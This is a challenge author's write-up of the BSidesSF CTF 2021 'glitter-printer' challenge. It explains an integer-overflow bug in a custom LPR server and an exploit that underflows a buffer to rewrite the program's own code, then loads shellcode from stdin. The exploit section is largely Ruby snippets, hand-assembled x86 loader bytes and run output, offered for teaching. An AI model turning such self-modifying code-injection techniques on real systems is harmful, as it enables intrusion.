---
id: 2508
title: 'BSidesSF CTF 2021 Author writeup: glitter-printer, a buffer underflow where you modify the actual code'
date: '2021-03-18T12:07:36-05:00'
author: 'Ron Bowes'
layout: post
guid: 'https://blog.skullsecurity.org/?p=2508'
permalink: /2021/bsidessf-ctf-2021-author-writeup-glitter-printer-a-buffer-underflow-where-you-modify-the-actual-code
categories:
    - CTFs
    - Hacking
    - 'Reverse Engineering'
---

Hi Everybody!

This is going to be a challenge-author writeup for the <a href="https://blogdata.skullsecurity.org/bsidessf2020/glitter-printer">Glitter Printer</a> challenge from <a href="https://ctftime.org/event/1299">BSides San Francisco 2021</a>.

First, a bit of history: the original idea I had behind Glitter Printer was to make a video game challenge involving cartridge-swap, where I'd write a handful of simple video games in 100% x86 code with no imports or anything (like an old fashioned cartridge game), and the player could swap between them without memory being re-initialized. Folks used to do this sorta thing on NES, and maybe I'll use it in a future challenge, but I decided to make this a bit simpler.

While experimenting with writing libraries without libc, I realized just how much work it was going to be to write a bunch of games, and decided to simplify. My next ide was to write a "driver" type thing, where a blob of code is loaded into +RWX memory and the player could go wild on it. The the name Glitter Printer came across my radar, I don't even remember why, and that gave me the idea to do an LPR server.

That's quite the background!

<!--more-->
<h2>The code</h2>
So I don't know if anybody actually noticed, but I implemented a good chunk of the Line Printer (LPR) RFC correctly. Well, I tried to anyways, I didn't actually test it with a real client. The hard part was introducing a realistic-looking vulnerability - in many of my CTF challenges, the vuln comes naturally. So naturally, in fact, that I often don't even need to plan it in advance! I ended up settling on an integer underflow.

If you look at <a href="https://github.com/BSidesSF/ctf-2021-release/tree/main/glitter-printer/challenge/src">the source</a> (specifically, core.c), you can see that the main loop reads a single byte, then performs an action accordingly:
<pre><span class="Type">void</span> _start(queue_t *queues) {
  <span class="Repeat">while</span>(<span class="Number">1</span>) {
    <span class="Type">char</span> command = read_byte(STDIN);

    <span class="Conditional">if</span>(command == <span class="Number">1</span>) {
      print_waiting_jobs();
    } <span class="Conditional">else</span> <span class="Conditional">if</span>(command == <span class="Number">2</span>) {
      receive_job(queues);
    } <span class="Conditional">else</span> <span class="Conditional">if</span>(command == <span class="Number">3</span>) {
      queue_state_list(queues, <span class="Number">0</span>);
    } <span class="Conditional">else</span> <span class="Conditional">if</span>(command == <span class="Number">4</span>) {
      queue_state_list(queues, <span class="Number">1</span>);
    } <span class="Conditional">else</span> <span class="Conditional">if</span>(command == <span class="Number">5</span>) {
      <span class="Comment">// 05 Queue SP Agent SP List LF - Remove jobs</span>
    } <span class="Conditional">else</span> {
      exit(<span class="Number">6</span>);
    }
  }
}
</pre>
As part of several commands (such as <tt>receive_job()</tt>), an ASCII number is sent to choose a queue to operate on. The queue number isn't a byte (like "\x01"), it's a number like "123" that needs to be parsed.

And by the way, this is still how LPR actually works!

Here's the code I used for parsing numbers.. I'm pretty sure I just grabbed this from Stack Overflow:
<pre><span class="Type">int</span> read_number(<span class="Type">char</span> *terminator) {
  <span class="Type">int</span> result = <span class="Number">0</span>;

  <span class="Repeat">while</span>(<span class="Number">1</span>) {
    <span class="Comment">// Read a single byte</span>
    <span class="Type">char</span> buffer = read_byte();

    <span class="Comment">// If it's not a valid byte, we're done (and we consume the terminator)</span>
    <span class="Conditional">if</span>(buffer &lt; <span class="Character">'0'</span> || buffer &gt; <span class="Character">'9'</span>) {
      <span class="Conditional">if</span>(terminator) {
        *terminator = buffer;
      }
      <span class="Statement">return</span> result;
    }

    <span class="Comment">// Add to the result and keep going (vulnerable to overflow!)</span>
    result = (result * <span class="Number">10</span>) + (buffer - <span class="Character">'0'</span>);
  }

  <span class="Statement">return</span> result;
}
</pre>
What you don't see in that code is input validation. In fact, I even put a comment where it's missing! If the number gets big enough that it can't fit into a 32-bit integer, it just keeps trying to cram it in. That means you can blow right past all the positive integers (in hex, 0x00000000 - 0x7FFFFFFF) and right into the negative numbers (in hex, 0x80000000 - 0xFFFFFFFF). A negative number leads to a buffer underflow and a bad time for the application (which means a good time for the hacker!)
<h2>The vulnerability</h2>
The <tt>receive_job()</tt> function uses the queue number to pick out which <tt>queue_t</tt> structure it's going to use:
<pre><span class="Structure">typedef</span> <span class="Structure">struct</span> {
  <span class="Type">int</span> active_jobs;
  <span class="Type">int</span> total_bytes_queued;
} queue_t;
</pre>
If a negative queue number is given, it'll process data that's in memory at lower addresses than the data structure. It just so happens, that's the program's code!

Each time you queue a job, it increments <tt>active_jobs</tt> field by one and adds the length of the job to <tt>total_bytes_queued</tt>. When you cancel a job, it decrements <tt>active_jobs</tt> by 1 and leaves <tt>total_bytes_queued</tt> alone. So basically, you have a weird primitive where you can increment and decrement one 32-bit value, and add somewhat larger chunks to a second (based on how much traffic you can send).

We're going to use that primitive to build a loader, from scratch, in a buffer. When the loader runs, it'll read then execute code from stdin. Then to call that loader, we'll modify some of the executable code so that when it's supposed to be handling a certain message type, it'll instead redirect execution into our loader.

I know that's a lot! We'll go through each part of that in detail below. If you're not super familiar with the concept of shellcode or how to write it, I've got you covered! Check out the <a href="https://blog.skullsecurity.org/2021/bsidessf-ctf-2021-author-writeup-shellcode-primer-runme-runme2-and-runme3">runme writeup</a>!
<h2>The exploit - overview</h2>
The exploit literally underflows the buffer to write to the code section. I wanted this to be unusual - how often do you get to exploit an executable to modify itself in memory?

One of the biggest problems I had was speed, because you need to do a lot of round-trips to slowly change code to what you need. I eventually realized I didn't have to wait a full request/response between sending new "jobs", so I probably artificially limited myself. But by the time I realized that, I'd already finished an exploit using only very simple values. It ended up actually looking a bit like a ROP chain!

You can grab my exploit <a href="https://github.com/BSidesSF/ctf-2021-release/blob/main/glitter-printer/solution/sploit.rb">here</a>. The summary is, I set up a call to this <tt>read()</tt> function from the actual binary, which is a thin wrapper around a syscall:
<pre>__attribute__((naked)) int read(int fd, char *buf, int count) {
  __asm__(
      "push ebp;"
      "mov ebp, esp;"
      "push ebx;"

      "mov eax, 3;" // sys_read
      "mov ebx, [ebp+8];" // f = arg1
      "mov ecx, [ebp+12];" // buf = arg2
      "mov edx, [ebp+16];" // count = arg3
      "int 0x80;"

      "pop ebx;"
      "pop ebp;"
      "ret;"
  );
}</pre>
In my exploit payload, I will call that read() function with fd set to 0 (stdin), buf set to anywhere that's writable and executable (where we can store code - it's exceptionally unusual to be in that situation!), and the count set to a value that's at least the size of the shellcode. Then we'll set up the stack so when read() returns, it returns directly to the code it just read. Let's see how!
<h2>The exploit - setting up the call</h2>
First, by reading through the assembly code, I identified some code that a) has registers loaded with useful values (ie, some +wx memory we talked about above), and b) that doesn't execute during any of the job-queuing code (ie, code that won't run till we do something special to trigger it).

I chose a particular point in the <tt>queue_state_list()</tt> function, which is only called when the user requests queue state information. At the point where I modify the code, the eax register points to a big block of writable, executable, and empty memory (the actual list of queue information). I replace the code that's already there with <tt>call eax</tt>, so when it executes, it calls into that memory. Here's what it looks like in my exploit:
<pre># Adds "call eax" at a point where eax contains our buffer
# This "call eax" happens in option "4" from the main menu, after doing this
# we can trigger the call anytime by sending "4"
change_word_to(0x79c, pack("ffd0")) # call eax
</pre>
<tt>change_word_to()</tt> smartly figures out how to actually make that change: the value that was at offset 0x79c is read, and the math to turn it into <tt>call eax</tt> is automatically done. All the math to turn that into an actual address is taken care of by the <tt>change_word_to()</tt> function.

Once that code has been written, I can trigger a call to our current-empty memory by invoking the <tt>queue_state_list()</tt> function, which means sending a payload with byte "\x04". Recall the code we saw earlier:
<pre>[...]
    } <span class="Conditional">else</span> <span class="Conditional">if</span>(command == <span class="Number">4</span>) {
      queue_state_list(queues, <span class="Number">1</span>);
    } <span class="Conditional">else</span> {
[...]
</pre>
<h2>Setting up the payload</h2>
For the rest of the exploit, I just need to write a bunch of code to that big empty section that we're prepared to call.

We know that the memory is initialized to all zeroes, which helps. We also know that, starting from the beginning, we have to make all of our changes in 8-byte blocks that match up with the <tt>queue_t</tt> struct. That means the first 4-byte value can be incremented, and the second 4-byte value can be modified in bigger chunks. That means we can have one instruction that has a "lower" value, and one that has a slightly "higher" value.

With that in mind, let's just look at the rest of the exploit, then analyze it:
<pre><span class="Comment"># Buffer the return address in ecx for now</span>
write_value_to((start += <span class="Number">8</span>), <span class="Number">0x02eb</span>, pack(<span class="rubyStringDelimiter">"</span><span class="String">5990</span><span class="rubyStringDelimiter">"</span>)) <span class="Comment"># pop ecx / nop</span>

<span class="Comment"># Length - esi is a reasonably long value when we arrive here</span>
write_value_to((start += <span class="Number">8</span>), <span class="Number">0x02eb</span>, pack(<span class="rubyStringDelimiter">"</span><span class="String">5690</span><span class="rubyStringDelimiter">"</span>)) <span class="Comment"># push esi / nop</span>

<span class="Comment"># buf - Use the stored return address as our buffer</span>
write_value_to((start += <span class="Number">8</span>), <span class="Number">0x02eb</span>, pack(<span class="rubyStringDelimiter">"</span><span class="String">5190</span><span class="rubyStringDelimiter">"</span>)) <span class="Comment"># push ecx / nop</span>

<span class="Comment"># fd - stdin is 0</span>
write_value_to((start += <span class="Number">8</span>), <span class="Number">0x02eb</span>, pack(<span class="rubyStringDelimiter">"</span><span class="String">6a00</span><span class="rubyStringDelimiter">"</span>)) <span class="Comment"># push byte 0</span>

<span class="Comment"># Return address - just ecx again</span>
<span class="Comment"># This is where read() (the function in the app, not the syscall) returns</span>
write_value_to((start += <span class="Number">8</span>), <span class="Number">0x02eb</span>, pack(<span class="rubyStringDelimiter">"</span><span class="String">5190</span><span class="rubyStringDelimiter">"</span>)) <span class="Comment"># push ecx / nop</span>

<span class="Comment"># We want to basically subtract a set value from ecx, using 2-byte chunks (which</span>
<span class="Comment"># it turns out was probably unnecessary).</span>
<span class="Comment">#</span>
<span class="Comment"># To do this, we clear cl, decrement ecx, and repeat a few times.</span>
write_value_to((start += <span class="Number">8</span>), <span class="Number">0x02eb</span>, pack(<span class="rubyStringDelimiter">"</span><span class="String">30c9</span><span class="rubyStringDelimiter">"</span>)) <span class="Comment"># xor cl, cl</span>
write_value_to((start += <span class="Number">8</span>), <span class="Number">0x02eb</span>, pack(<span class="rubyStringDelimiter">"</span><span class="String">4990</span><span class="rubyStringDelimiter">"</span>)) <span class="Comment"># dec ecx / nop</span>
write_value_to((start += <span class="Number">8</span>), <span class="Number">0x02eb</span>, pack(<span class="rubyStringDelimiter">"</span><span class="String">30c9</span><span class="rubyStringDelimiter">"</span>)) <span class="Comment"># xor cl, cl</span>
write_value_to((start += <span class="Number">8</span>), <span class="Number">0x02eb</span>, pack(<span class="rubyStringDelimiter">"</span><span class="String">4990</span><span class="rubyStringDelimiter">"</span>)) <span class="Comment"># dec ecx / nop</span>
write_value_to((start += <span class="Number">8</span>), <span class="Number">0x02eb</span>, pack(<span class="rubyStringDelimiter">"</span><span class="String">30c9</span><span class="rubyStringDelimiter">"</span>)) <span class="Comment"># xor cl, cl</span>
write_value_to((start += <span class="Number">8</span>), <span class="Number">0x02eb</span>, pack(<span class="rubyStringDelimiter">"</span><span class="String">4990</span><span class="rubyStringDelimiter">"</span>)) <span class="Comment"># dec ecx / nop</span>
write_value_to((start += <span class="Number">8</span>), <span class="Number">0x02eb</span>, pack(<span class="rubyStringDelimiter">"</span><span class="String">30c9</span><span class="rubyStringDelimiter">"</span>)) <span class="Comment"># xor cl, cl</span>
write_value_to((start += <span class="Number">8</span>), <span class="Number">0x02eb</span>, pack(<span class="rubyStringDelimiter">"</span><span class="String">4990</span><span class="rubyStringDelimiter">"</span>)) <span class="Comment"># dec ecx / nop</span>
write_value_to((start += <span class="Number">8</span>), <span class="Number">0x02eb</span>, pack(<span class="rubyStringDelimiter">"</span><span class="String">30c9</span><span class="rubyStringDelimiter">"</span>)) <span class="Comment"># xor cl, cl</span>
write_value_to((start += <span class="Number">8</span>), <span class="Number">0x02eb</span>, pack(<span class="rubyStringDelimiter">"</span><span class="String">4990</span><span class="rubyStringDelimiter">"</span>)) <span class="Comment"># dec ecx / nop</span>
write_value_to((start += <span class="Number">8</span>), <span class="Number">0x02eb</span>, pack(<span class="rubyStringDelimiter">"</span><span class="String">30c9</span><span class="rubyStringDelimiter">"</span>)) <span class="Comment"># xor cl, cl</span>
write_value_to((start += <span class="Number">8</span>), <span class="Number">0x02eb</span>, pack(<span class="rubyStringDelimiter">"</span><span class="String">4990</span><span class="rubyStringDelimiter">"</span>)) <span class="Comment"># dec ecx / nop</span>
write_value_to((start += <span class="Number">8</span>), <span class="Number">0x02eb</span>, pack(<span class="rubyStringDelimiter">"</span><span class="String">30c9</span><span class="rubyStringDelimiter">"</span>)) <span class="Comment"># xor cl, cl</span>
write_value_to((start += <span class="Number">8</span>), <span class="Number">0x02eb</span>, pack(<span class="rubyStringDelimiter">"</span><span class="String">4990</span><span class="rubyStringDelimiter">"</span>)) <span class="Comment"># dec ecx / nop</span>
write_value_to((start += <span class="Number">8</span>), <span class="Number">0x02eb</span>, pack(<span class="rubyStringDelimiter">"</span><span class="String">30c9</span><span class="rubyStringDelimiter">"</span>)) <span class="Comment"># xor cl, cl</span>

<span class="Comment"># At this point, ecx points to the start of the code. The read() function is 0x11</span>
<span class="Comment"># bytes into the executable, so move 0x11 to cl</span>
write_value_to((start += <span class="Number">8</span>), <span class="Number">0x02eb</span>, pack(<span class="rubyStringDelimiter">"</span><span class="String">b111</span><span class="rubyStringDelimiter">"</span>)) <span class="Comment"># mov cl, 11 (offset to read())</span>

<span class="Comment"># Now that ecx points to the start of read(), jump to it</span>
write_value_to((start += <span class="Number">8</span>), <span class="Number">0x02eb</span>, pack(<span class="rubyStringDelimiter">"</span><span class="String">ffe1</span><span class="rubyStringDelimiter">"</span>)) <span class="Comment"># jmp ecx</span>
</pre>
That code does require some unpacking, pun intended. :)

The <tt>write_value_to</tt> function is another helper function I wrote. You pass in an address as the first argument, and it calculates the underflow value to set that address. Then the second parameter is the field that's set by the increments, and the third is the field that's set by the chunks. That means the second parameter needs to be reasonably small, and the third parameter can be bigger, but should still be less than 65536 (I'm not sure if that's truly the case, but that's the limitation that I had in mind).

<tt>write_value_to</tt> sets the big value first, then either increments or decrements the other value as needed to get it to where it needs to go, so it's mildly efficient in that way.

I had planned to do more with the first value, but I actually ended up realizing that 0x02eb was a very low no-op, and decided to just use that for everything:
<pre>$ echo -ne '\xeb\x02' | ndisasm -b32 -
00000000  EB02              jmp short 0x4
</pre>
In retrospect, I think leaving it at 00 00 would have actually worked as well, since we keep eax as a writable value the whole time:
<pre>$ echo -ne '\x00\x00' | ndisasm -b32 -
00000000  0000              add [eax],al
</pre>
So the <tt>active_jobs</tt> (incremental) field is always just a no-op, which means we're writing code using the <tt>total_bytes_queued</tt> (adding bigger chunks) field. While that field is more flexible, we still can't do full 4-byte values without our exploit taking days. 3-byte chunks migghhhhht work, but that'd require a bunch of traffic. So we're going to endeavour to do everything in 2 bytes or less.

I mentioned earlier that we're setting up a call to this read function:
<pre>__attribute__((naked)) int read(int fd, char *buf, int count) // [...]
</pre>
That function is always at a set address, which we know, and uses stack-based parameters. Here's the code that we end up creating, all broken nicely into 2 bytes (I don't know why I used 90 for a NOP in the second field, then left the 00 00 at the end as an additional NOP.. let's call that tunnel vision):
<pre>; Set up the parameters to read()
59 90   pop ecx / nop ; Since we will have just done 'call eax' to get to this code, the return address is something we can use as a buffer (we're gonna overwrite code by doing this)
56 90   push esi / nop ; Length value = a register that happens to have a higher value in it
51 90   push ecx / nop ; Buffer to read into = the eventually return address (again, we're going to overwrite the code that's there with shellcode)
6a 00   push byte 0 ; Read from stdin
51 90   push ecx / nop ; Since we're about to do jmp into read(), when read() attempts to return this will be the address it uses

; Get the address of read() - this is a set-in-stone address, but because we're
; limited to very small instructions, I do effectively 'sub ecx, &lt;constant value&gt;'
; over and over to nudge it to where it needs to be:
30 c9   xor cl, cl
49 90   dec ecx / nop
30 c9   xor cl, cl
49 90   dec ecx / nop
30 c9   xor cl, cl
49 90   dec ecx / nop
30 c9   xor cl, cl
49 90   dec ecx / nop
30 c9   xor cl, cl
49 90   dec ecx / nop
30 c9   xor cl, cl
49 90   dec ecx / nop
30 c9   xor cl, cl
49 90   dec ecx / nop
30 c9   xor cl, cl

; At this point, ecx points to the absolute start of the code. read() is 0x11
; bytes from the start, so effectively add 0x11 to ecx
b1 11   mov cl, 11 ; Offset to read()

; Now that ecx points to read(), we can just jump to it (remember, the return
; address isn't set by call; it was set earlier, so read() will return straight
; into the buffer it's reading into (kinda like ROP)
ff e1   jmp ecx
</pre>
So this will jump to the <tt>read()</tt> call. Read will look at its stack for its arguments, which we put there. Then it does the syscall, reading whatever we send next into an executable part of memory. This destroys all the memory that was there, and replaces it with our own shellcode (you can use literally any shellcode for that). Being able to overwrite arbitrary executable memory is really, really bad in a real application - you never want +wx memory (in fact, there's a concept called <tt>w^x</tt>, which implies that if you have memory that's either writable or executable, it can't be the other simultaneously).

When <tt>read()</tt> wants to return, it looks at the stack to find the return address. Since we pushed the buffer's address to the stack in lieu of doing an actual <tt>call</tt> instruction, the next thing on the stack is the buffer. So it returns to the buffer, then executes it.

One that's done, all we have to do is call the function that we modified and then send over our shellcode:
<pre># Trigger the "call eax", finally
S.write("\x040\n")

# When the call runs, it'll (hopefully) stop at read() and wait for code to run
S.write(SHELLCODE)
</pre>
And watch it in action:
<pre>$ ruby ./sploit.rb glitter-printer-373f4c45.challenges.bsidessf.net 515
Current: ff7885c7
Desired: ff78d0ff
(Fast - non-multiple of 8) incrementing by 19256
Writing to 798 (0 / 4b38)...
Writing to 4000 (2eb / 9059)...
Writing to 4008 (2eb / 9056)...
Writing to 4010 (2eb / 9051)...
Writing to 4018 (2eb / 6a)...
Writing to 4020 (2eb / 9051)...
Writing to 4028 (2eb / c930)...
Writing to 4030 (2eb / 9049)...
Writing to 4038 (2eb / c930)...
Writing to 4040 (2eb / 9049)...
Writing to 4048 (2eb / c930)...
Writing to 4050 (2eb / 9049)...
Writing to 4058 (2eb / c930)...
Writing to 4060 (2eb / 9049)...
Writing to 4068 (2eb / c930)...
Writing to 4070 (2eb / 9049)...
Writing to 4078 (2eb / c930)...
Writing to 4080 (2eb / 9049)...
Writing to 4088 (2eb / c930)...
Writing to 4090 (2eb / 9049)...
Writing to 4098 (2eb / c930)...
Writing to 40a0 (2eb / 11b1)...
Writing to 40a8 (2eb / e1ff)...
CTF{hackin_it_oldschool}
</pre>
If you want to play around and the server is no longer online, the docker container is in the challenge/ folder!
<h2>Conclusion</h2>
I bet there are other solutions, but I enjoyed writing this a ton. Trying to leverage a mix of ROP-style concepts (like returning into the buffer we just filled) with writing directly to code was neat, and limiting shellcode to 2 bytes at a time was also an interesting challenge. I later realized that, since I don't have to actually wait for the full round-trip, I probably could have used a few 3-byte instructions. But this works, and I'm proud of it!